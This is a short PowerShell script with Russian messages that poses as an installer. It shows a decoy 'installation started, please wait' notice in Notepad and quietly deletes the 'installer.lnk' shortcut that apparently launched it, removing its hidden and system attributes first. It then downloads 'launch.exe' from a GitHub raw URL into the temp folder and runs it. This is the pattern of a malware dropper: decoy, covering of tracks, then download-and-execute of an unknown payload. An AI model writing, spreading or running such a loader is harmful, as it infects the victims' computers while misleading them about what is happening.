$txt = "$env:TEMP\info.txt"

@"
Установка запущена.

Пожалуйста, подождите...
"@ | Out-File $txt -Encoding UTF8

Start-Process notepad.exe $txt

$folder = (Get-Location).Path

$lnk = Join-Path $folder "installer.lnk"
$txt = Join-Path $folder "installer.txt"

Start-Sleep -Seconds 5

Write-Host "Пытаюсь удалить: $lnk"

if (Test-Path $lnk) {
    # attrib -r -s -h $lnk
    # [System.IO.File]::Delete($lnk)

    try {
        attrib -r -s -h $lnk 2>$null
        Remove-Item $lnk -Force -ErrorAction Stop
        Write-Host "Файл успешно удалён."
    } catch {
        Write-Host "Не удалось удалить: $_"
    }
} else {
    Write-Host "Файл не найден по указанному пути."
}

@"
Установка запущена.

Пожалуйста, подождите...
"@ | Out-File $txt -Encoding UTF8

$wc = New-Object System.Net.WebClient
$wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
& "$env:TEMP\a.exe"
